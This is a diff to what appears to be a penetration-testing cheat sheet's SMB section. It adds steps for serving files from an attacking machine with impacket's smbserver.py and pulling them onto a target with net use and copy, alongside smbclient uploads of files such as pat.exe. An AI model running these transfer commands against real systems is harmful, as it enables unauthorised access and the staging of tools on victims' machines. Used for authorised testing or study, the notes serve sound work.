@@ -528,9 +528,14 @@ cat /tmp/cme_spider_plus/<target-ip>.json
   - smb-vuln*
 
 - Transfer files
-  - smbclient -U USER '//IP/folder'
-  - put file.name
-  - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD
+  - On attacking maching
+    - smbserver.py share .
+  - On target
+    - net use \\AttackingIP\share
+    - copy \\IP\\share\file.ext
+    - smbclient -U USER '//IP/folder'
+    - put file.name
+    - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD
 
 - Use impacket
 ```
